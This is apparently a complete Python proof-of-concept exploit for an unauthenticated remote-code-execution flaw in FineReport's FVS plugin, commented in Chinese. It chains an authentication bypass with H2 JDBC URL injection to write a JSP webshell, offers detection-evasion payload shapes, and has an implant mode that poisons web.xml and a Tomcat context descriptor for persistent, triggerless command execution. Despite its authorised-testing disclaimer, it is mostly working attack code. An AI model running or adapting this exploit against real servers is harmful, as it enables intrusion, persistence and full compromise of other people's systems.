#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FineReport FVS 插件未授权 RCE PoC —— 路线一：H2 数据连接层注入（fr-fvs-unauth-rce）
====================================================================================
配套: poc-attach.py(路线二: 附件层 web.xml 投毒) | 原理见 vulnerability-analysis.md
影响: FineReport < 11.5.16（FVS/Duchamp 复用资源链路，实验基线 11.5.15 + wysiwyg 4.13.0）
链路: tplPath 鉴权绕过 → 未授权上传复用包(props.name 注入 H2 JDBC URL 的 INIT)
      → testConnection 执行 CALL FILE_WRITE 任意文件写（任意路径/后缀/大小）

两种模式:
  交互模式(默认): 写 JSP 至 ROOT webapp（绕过只监控 webroot 的 JSP-Monitor）
                  → GET ?c=<命令> 触发 Tomcat 编译执行 → 输出落 webroot → 回读
  植入模式 --implant(全自动, 出厂镜像实测零重启):
                  枪1 投毒 WEB-INF/web.xml   枪2 WEB-INF/x.env(jspInit, 命令固化)
                  枪3 Tomcat 上下文描述符 conf/Catalina/localhost/<name>.xml(容器配置)
                  → autoDeploy(Tomcat 与 FR 镜像默认开启)数秒内自动部署新上下文
                  → 部署时 Jasper 预编译 x.env → jspInit() 执行 → 输出落 webroot → 回读
                  (全程无触发请求; --no-desc 可只植入不触发, 等目标重启/重部署)

条件: 目标为 Linux(命令经 /bin/sh 执行); FR 进程对 Tomcat 目录有写权限(官方镜像以 root 运行)。

仅用于授权测试 / 自建靶场。禁止指向生产或他人资产。

用法:
  python3 poc-h2.py -t http://127.0.0.1:18081                       # 交互: 默认命令, 落地并回读
  python3 poc-h2.py -t http://127.0.0.1:18081 -c "id"               # 交互: 自定义命令
  python3 poc-h2.py -t http://127.0.0.1:18081 --shape stealth       # 交互: 高级规避形态(全隐身)
  python3 poc-h2.py -t http://127.0.0.1:18081 --implant             # 植入: 全自动, 约 45 秒出结果
  python3 poc-h2.py -t http://127.0.0.1:18081 --implant -c "id"     # 植入: 自定义命令(写入时固化)
  python3 poc-h2.py -h                                               # 全部参数(--tomcat-home / --no-desc 等)
形态(均经靶场实测):
  raw      基线
  lower    全小写
  comment  注释交错
  concat   hex 块拼接
  stealth  终极叠加: JSON \\uXXXX 全转义(HTTP 层零 SQL/hex/路径/后缀特征) + hex 切块
           + CONCAT/CHAR 在 H2 内运行期拼出 .jsp 后缀(请求中无明文后缀) + 小写 + 注释
           + 路由段百分号编码(v%69ew/%69tem) + apply 参数入 POST body + 绝对 URI 请求行
"""
import argparse
import http.client
import io
import json
import sys
import urllib.parse
import urllib.request
import zipfile

JSP = ('<%=Runtime.getRuntime().exec(new String[]'
       '{"/bin/sh","-c",request.getParameter("c")}).waitFor()%>')

IMPLANT_WEBXML = ('<?xml version="1.0" encoding="UTF-8"?>\n'
'<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">\n'
'  <servlet>\n'
'    <servlet-name>xs</servlet-name>\n'
'    <jsp-file>/WEB-INF/x.env</jsp-file>\n'
'    <load-on-startup>1</load-on-startup>\n'
'  </servlet>\n'
'</web-app>\n')


def make_jsp_init(cmd: str) -> str:
    """jspInit 声明块: 容器重载预编译时自动执行, 零触发请求(命令写入时固化)。"""
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return ('<%! public void jspInit() {\n'
            '  try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",'
            '"' + esc + '"}).waitFor(); } catch (Throwable t) {}\n'
            '} %>')


def chunk_write_name(content: bytes, target: str) -> str:
    """任意长度内容: hex 切 20 字符块, 块间 ||/*q*/ —— 注释里的 / 切分路径组件,
    绕开单组件 255 字节限制(实测组件最长 48B)。"""
    h = content.hex().upper()
    chunks = [h[i:i + 20] for i in range(0, len(h), 20)]
    blob = "||/*q*/".join("X'" + c + "'" for c in chunks)
    return "x;INIT=CALL FILE_WRITE(" + blob + ", '" + target + "')--"


INFO_XML = """<?xml version="1.0" encoding="UTF-8"?>
<ITEM>
<structureVersion>2.0</structureVersion>
<name>poc</name>
<entityType>fvs</entityType>
<envVersion>11.0</envVersion>
</ITEM>
"""
BIZ_LAYER = ('{"entityMappings":[{"uuid":"e1","id":"reportlets/poc/main.fvs"}],'
             '"staticInfos":[],"attachInfos":[]}')
ATTACH_LAYER = ('{"attachInfos":[{"exportPath":"content/biz/attachments/a.env",'
                '"originPath":"a.env"}],"staticInfos":[],"attachInfos":[]}')
DATA_LAYER = ('{"tableInfos":[],"staticInfos":[],"attachInfos":[],'
              '"extraAttributes":{"example_db_depend_key":"1"}}')


def build_pack() -> bytes:
    """复用包(zip)。data/appdata.mv.db 内容任意——导入时只被读出写盘,
    真正打开的是 name 截断路径上的临时库,与该文件内容无关。"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("resource/info.xml", INFO_XML)
        z.writestr("content/biz/BizLayer.json", BIZ_LAYER)
        z.writestr("content/biz/e1/mainContentFileName.fvs", '{"widgets":[],"version":"1.0"}')
        z.writestr("content/biz/e1/BizEntityInfoBean.json", '{"id":"e1","type":1}')
        z.writestr("content/biz/e1/ReportletMapping.json", '{"mappings":[]}')
        z.writestr("content/biz/attachments/a.env", "x")
        z.writestr("content/biz/attachments/AttachmentLayer.json", ATTACH_LAYER)
        z.writestr("content/data/DataLayer.json", DATA_LAYER)
        z.writestr("content/data/appdata.mv.db", b"POCDUMMY" * 4)
    return buf.getvalue()


def payload_name(jsp_hex: str, target: str, shape: str):
    """返回 (name 明文, 是否需要 \\u 全转义)。target 为 stealth 时给"目录/主名"(不带后缀)"""
    chunks = [jsp_hex[i:i + 24] for i in range(0, len(jsp_hex), 24)]
    if shape == "raw":
        return f"x;INIT=CALL FILE_WRITE(X'{jsp_hex}', '{target}')--", False
    if shape == "lower":
        return f"x;init=call file_write(X'{jsp_hex}', '{target}')--", False
    if shape == "comment":
        return f"x;INIT=CALL /*q*/ FILE_WRITE(X'{jsp_hex}', '{target}')--", False
    if shape == "concat":
        half = len(jsp_hex) // 2
        return (f"x;INIT=CALL FILE_WRITE(X'{jsp_hex[:half]}'||X'{jsp_hex[half:]}', "
                f"'{target}')--", False)
    if shape == "stealth":
        # 目录+主名由 CONCAT 与 CHAR() 拼出 .jsp —— 明文后缀不出现在请求中
        blob = "||".join("X'" + c + "'" for c in chunks)
        sql = (f"x;init=call /*a*/file_write({blob}, "
               f"concat(/*b*/'{target}', char(46),char(106),char(115),char(112)))--")
        return sql, True  # True → 整条 name 以 \uXXXX 转义放进 JSON
    raise ValueError(shape)


def http_req(urlp, method="GET", body=None, ctype=None, absolute=False, timeout=40):
    """urlp = 已 split 的 url;absolute=True 时请求行用绝对 URI(absolute-form)"""
    host, port, path = urlp.hostname, urlp.port or 80, urlp.path + (
        "?" + urlp.query if urlp.query else "")
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    target = f"http://{host}:{port}{path}" if absolute else path
    conn.request(method, target, body=body,
                 headers={"Content-Type": ctype} if ctype else {})
    r = conn.getresponse()
    data = r.read()
    conn.close()
    return r.status, data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", required=True, help="引擎基址, 如 http://ip:18081")
    ap.add_argument("-c", "--cmd", default=None, help="要执行的命令(默认写标记到 webroot 并回读)")
    ap.add_argument("--shape", default="raw",
                    choices=["raw", "lower", "comment", "concat", "stealth"])
    ap.add_argument("--jsp-name", default="pwn_fvs.jsp",
                    help="stealth 形态下只需主名(自动拼后缀)")
    ap.add_argument("--implant", action="store_true",
                    help="植入模式(全自动): 写投毒 web.xml + jspInit + 容器描述符, "
                         "autoDeploy 自动重载并执行命令(零重启, 零触发请求)")
    ap.add_argument("--wait", type=int, default=180, help="植入模式等待自动执行的最长秒数")
    ap.add_argument("--tomcat-home", default="/usr/local/tomcat", help="植入模式: Tomcat 根目录")
    ap.add_argument("--ctx-name", default="z", help="植入模式: 自动部署的上下文名")
    ap.add_argument("--no-desc", action="store_true", help="植入模式: 不写容器描述符(仅植入, 等重启)")
    ap.add_argument("--write-dir", default="/usr/local/tomcat/webapps/ROOT",
                    help="JSP 写入目录(ROOT=默认context,避开只盯 webroot 的 JSP-Monitor)")
    a = ap.parse_args()

    if a.implant:
        sys.exit(run_implant(a))
    base = a.target.rstrip("/")
    o = urllib.parse.urlsplit(base)
    origin = f"{o.scheme}://{o.netloc}"
    stealth = a.shape == "stealth"
    # stealth: target = 目录+主名(无后缀), GET 用主名.jsp
    base_name = a.jsp_name[:-4] if a.jsp_name.endswith(".jsp") else a.jsp_name
    target = (a.write_dir.rstrip("/") + "/" + base_name) if stealth \
        else a.write_dir.rstrip("/") + "/" + a.jsp_name
    get_name = base_name + ".jsp" if stealth else a.jsp_name
    readback = f"{origin}/webroot/pwn_poc_readback.txt"
    if a.cmd:  # 自定义命令: 自动包装成 可回读 形式(输出落 webroot 再取回打印)
        cmd = f"( {a.cmd} ) > /usr/local/tomcat/webapps/webroot/pwn_poc_readback.txt 2>&1"
    else:
        cmd = (f"(echo PWN-FVS-UNAUTH-RCE; id; hostname; date) > "
               f"/usr/local/tomcat/webapps/webroot/pwn_poc_readback.txt 2>&1")

    name, u_esc = payload_name(JSP.encode().hex().upper(), target, a.shape)
    print(f"[*] shape={a.shape}  name={len(name)}B  组件≤{len(name.split('/')[0])}B")
    if not u_esc:
        print(f"[*] name = {name[:88]}...")

    # ---- 1) 未授权上传复用包 ----
    if u_esc:
        name_val = "".join("\\u%04x" % ord(c) for c in name)
    else:
        name_val = name.replace('"', '\\"')
    props = ('{"name": "%s", "structureVersion": "2.0", "envVersion": "11.0"}' % name_val)
    qs = ("tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props="
          + urllib.parse.quote(props, safe=""))
    route = ("/v%69ew/duchamp/reuse/%69tem" if stealth
             else "/view/duchamp/reuse/item")
    b = "----poc114516"
    body = (f"--{b}\r\n".encode()
            + b'Content-Disposition: form-data; name="file"; filename="pwn.mfvs"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + build_pack()
            + f"\r\n--{b}--\r\n".encode())
    up_url = urllib.parse.urlsplit(f"{base}/webroot/decision{route}?{qs}")
    st, data = http_req(up_url, "POST", body, f"multipart/form-data; boundary={b}",
                        absolute=stealth)
    rid = json.loads(data).get("id", "") if st == 200 else ""
    print(f"[1] upload  -> {st}  id={rid}")
    if not rid:
        print("    上传失败:", data[:200]); sys.exit(1)

    # ---- 2) 未授权 apply(stealth: 参数入 POST form body) ----
    if stealth:
        st2, d2 = http_req(urllib.parse.urlsplit(
            f"{base}/webroot/decision/view/duchamp/reuse/apply/v2/tpl"), "POST",
            urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": "pocout"}),
            "application/x-www-form-urlencoded", timeout=120)
    else:
        q = urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": "pocout"})
        st2, d2 = http_req(urllib.parse.urlsplit(
            f"{base}/webroot/decision/view/duchamp/reuse/apply/v2/tpl?{q}"),
            "POST", b"", timeout=120)
    print(f"[2] apply   -> {st2}  {d2[:110].decode('utf-8', 'replace')}")

    # ---- 3) GET 触发 JSP 命令执行 ----
    try:
        st3, d3 = http_req(urllib.parse.urlsplit(
            f"{origin}/{get_name}?" + urllib.parse.urlencode({"c": cmd})), timeout=20)
        print(f"[3] trigger -> {st3}  waitFor={d3.decode('utf-8', 'replace').strip()}")
    except Exception as e:
        print(f"[3] trigger -> 异常 {e} (JSP 已执行但命令报错也常见, 看回读)")

    # ---- 4) Web 路径回读(命令输出) ----
    try:
        st4, d4 = http_req(urllib.parse.urlsplit(readback), timeout=10)
        print(f"[4] readback-> {st4}\n{'-' * 46}\n"
              f"{d4.decode('utf-8', 'replace').strip()}\n{'-' * 46}")
    except Exception as e:
        print(f"[4] readback-> 异常 {e}")
    print("[*] 完成。")

def _fire_one(base, name, timeout=120):
    """单枪: 上传+apply(名称携带注入)"""
    props_val = name.replace('"', '\\"')
    props = ('{"name": "%s", "structureVersion": "2.0", "envVersion": "11.0"}' % props_val)
    qs = ("tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props="
          + urllib.parse.quote(props, safe=""))
    b = "----poc114516"
    body = (f"--{b}\r\n".encode()
            + b'Content-Disposition: form-data; name="file"; filename="p.mfvs"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + build_pack()
            + f"\r\n--{b}--\r\n".encode())
    st, data = http_req(urllib.parse.urlsplit(
        f"{base}/webroot/decision/view/duchamp/reuse/item?{qs}"), "POST", body,
        f"multipart/form-data; boundary={b}")
    try:
        rid = json.loads(data).get("id", "")
    except Exception:
        rid = ""
    if not rid:
        print("    上传失败:", st, data[:160]); return None
    q = urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": "pocout"})
    st2, d2 = http_req(urllib.parse.urlsplit(
        f"{base}/webroot/decision/view/duchamp/reuse/apply/v2/tpl?{q}"), "POST", b"",
        timeout=timeout)
    return f"{st}/{st2}"


def run_implant(a):
    """H2 路线的重载驱动植入(全自动):
       枪1 投毒 web.xml  枪2 jspInit(x.env)  枪3 Tomcat 上下文描述符(容器配置)
       枪3 落盘后, HostConfig 的 autoDeploy(Tomcat 与 FR 镜像默认开启)数秒内自动部署新上下文,
       部署过程中 Jasper 预编译 x.env → jspInit() 执行 —— 无需重启, 无触发请求。"""
    import time
    base = a.target.rstrip("/")
    o = urllib.parse.urlsplit(base)
    origin = f"{o.scheme}://{o.netloc}"
    tomcat = a.tomcat_home.rstrip("/")
    docbase = tomcat + "/webapps/webroot"
    web_inf = docbase + "/WEB-INF"
    readback = f"{origin}/webroot/implant_readback.txt"
    if a.cmd:
        cmd = f"( {a.cmd} ) > {docbase}/implant_readback.txt 2>&1"
    else:
        cmd = (f"(echo PWN-H2-IMPLANT; id; hostname; date) > "
               f"{docbase}/implant_readback.txt 2>&1")
    print(f"[*] 植入模式(全自动): 投毒 web.xml + jspInit + 容器描述符 -> {web_inf}")
    r1 = _fire_one(base, chunk_write_name(IMPLANT_WEBXML.encode(), web_inf + "/web.xml"))
    print(f"[1] web.xml(投毒)   -> {r1}")
    r2 = _fire_one(base, chunk_write_name(make_jsp_init(cmd).encode(), web_inf + "/x.env"))
    print(f"[2] x.env(jspInit)  -> {r2}")
    if r1 is None or r2 is None:
        print("    植入文件写入失败, 中止。"); return 1
    if a.no_desc:
        print("[3] 已跳过描述符(仅植入): 任何重启/重部署时 jspInit 自动执行。")
    else:
        desc = f'<Context docBase="{docbase}" />'
        target = f"{tomcat}/conf/Catalina/localhost/{a.ctx_name}.xml"
        r3 = _fire_one(base, chunk_write_name(desc.encode(), target))
        print(f"[3] 容器描述符      -> {r3}   ({target})")
        if r3 is None:
            print("    描述符写入失败: 无法自动触发, 退化为重启/重部署后执行。")
        else:
            print(f"[4] 等待 autoDeploy 自动部署并执行(最长 {a.wait}s, 实测 10~60s)...")
    deadline = time.time() + a.wait
    while time.time() < deadline:
        try:
            stp, dp = http_req(urllib.parse.urlsplit(readback), timeout=8)
            if stp == 200 and dp.strip():
                print("    命令已自动执行(零重启, 零触发请求):")
                print("-" * 46); print(dp.decode("utf-8", "replace").strip()); print("-" * 46)
                return 0
        except Exception:
            pass
        time.sleep(6)
    print("    超时: 期间未发生重载。已植入——任何重启/重部署时 jspInit 自动执行。")
    if not a.no_desc:
        print("    描述符已写却未触发: 确认 --tomcat-home 指向目标 Tomcat 根目录, 且其 autoDeploy 未被关闭。")
    return 2

if __name__ == "__main__":
    main()
